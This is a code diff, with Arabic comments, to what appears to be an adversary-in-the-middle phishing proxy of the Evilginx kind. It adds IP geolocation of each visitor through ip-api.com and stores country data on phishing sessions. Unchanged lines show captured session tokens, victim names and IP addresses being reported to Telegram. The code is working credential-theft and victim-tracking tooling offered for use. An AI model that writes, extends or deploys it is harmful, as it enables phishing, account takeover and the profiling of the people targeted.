@@ -587,24 +587,49 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 
+									// التحقق من وجود معلمات البلد في الطلب وتعيينها للجلسة
+									countryCode, ok := session.Params["cc"]
+									if ok && countryCode != "" {
+										session.SetCountryCode(countryCode)
+										log.Debug("تم تعيين رمز البلد: %s", countryCode)
+									}
+									
+									country, ok := session.Params["country"]
+									if ok && country != "" {
+										session.SetCountry(country)
+										log.Debug("تم تعيين اسم البلد: %s", country)
+									}
+									
+									// إذا لم تكن معلمات البلد موجودة في الطلب، يمكن استخراجها من عنوان IP
+									if (session.CountryCode == "" || session.Country == "") && remote_addr != "" {
+										// استخدام خدمة تحديد موقع IP للحصول على بيانات البلد
+										log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", remote_addr)
+										
+										cc, country := getIPGeoInfo(remote_addr)
+										if cc != "" {
+											session.SetCountryCode(cc)
+											log.Success("[%d] تم تعيين رمز البلد من IP: %s", sid, cc)
+										}
+										if country != "" {
+											session.SetCountry(country)
+											log.Success("[%d] تم تعيين اسم البلد من IP: %s", sid, country)
+										}
+									}
+
+									// إضافة معلومات البلد إلى قاعدة البيانات
+									if session.CountryCode != "" || session.Country != "" {
+										if err := p.db.SetSessionCountryInfo(session.Id, session.CountryCode, session.Country); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
+
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
-									
-									session.RemoteAddr = remote_addr
-									session.UserAgent = req.Header.Get("User-Agent")
-									// استخراج معلومات الجهاز والمتصفح من User-Agent
-									session.ParseUserAgent()
-									// محاولة استخراج معلومات البلد من عنوان IP
-									session.ExtractCountryFromIP()
-									
-									if err := p.db.CreateSession(
-										session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr,
-										session.CountryCode, session.CountryName,
-										session.DeviceType, session.BrowserType, session.BrowserVersion, session.OSType, session.OSVersion,
-										session.LoginType, session.Has2FA, session.Type2FA,
-									); err != nil {
+									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
 										log.Error("database: %v", err)
 									}
 
+									session.RemoteAddr = remote_addr
+									session.UserAgent = req.Header.Get("User-Agent")
 									session.RedirectURL = pl.RedirectUrl
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
@@ -2602,4 +2627,59 @@ func (p *HttpProxy) notifyTokensCaptured(sid string) {
 		// إرسال إشعار بالتقاط الرموز
 		go p.telegram.NotifyTokensCaptured(sid, s.Name, s.RemoteAddr)
 	}
+}
+
+// دالة للحصول على معلومات البلد من عنوان IP
+func getIPGeoInfo(ipAddress string) (countryCode string, country string) {
+	if ipAddress == "" || ipAddress == "127.0.0.1" || strings.HasPrefix(ipAddress, "192.168.") {
+		return "", ""
+	}
+	
+	// تنظيف عنوان IP (إزالة رقم المنفذ إن وجد)
+	parts := strings.Split(ipAddress, ":")
+	cleanIP := parts[0]
+	
+	// استخدام خدمة ipapi.co للحصول على معلومات البلد
+	url := "http://ip-api.com/json/" + cleanIP + "?fields=status,countryCode,country"
+	
+	client := &http.Client{
+		Timeout: 3 * time.Second,
+	}
+	
+	resp, err := client.Get(url)
+	if err != nil {
+		log.Error("فشل استعلام خدمة تحديد موقع IP: %v", err)
+		return "", ""
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != http.StatusOK {
+		log.Error("خدمة تحديد موقع IP أعادت رمز حالة غير صحيح: %d", resp.StatusCode)
+		return "", ""
+	}
+	
+	var result map[string]interface{}
+	err = json.NewDecoder(resp.Body).Decode(&result)
+	if err != nil {
+		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP: %v", err)
+		return "", ""
+	}
+	
+	status, ok := result["status"].(string)
+	if !ok || status != "success" {
+		log.Error("خدمة تحديد موقع IP أعادت حالة غير ناجحة")
+		return "", ""
+	}
+	
+	cc, ok := result["countryCode"].(string)
+	if ok {
+		countryCode = cc
+	}
+	
+	c, ok := result["country"].(string)
+	if ok {
+		country = c
+	}
+	
+	return countryCode, country
 }
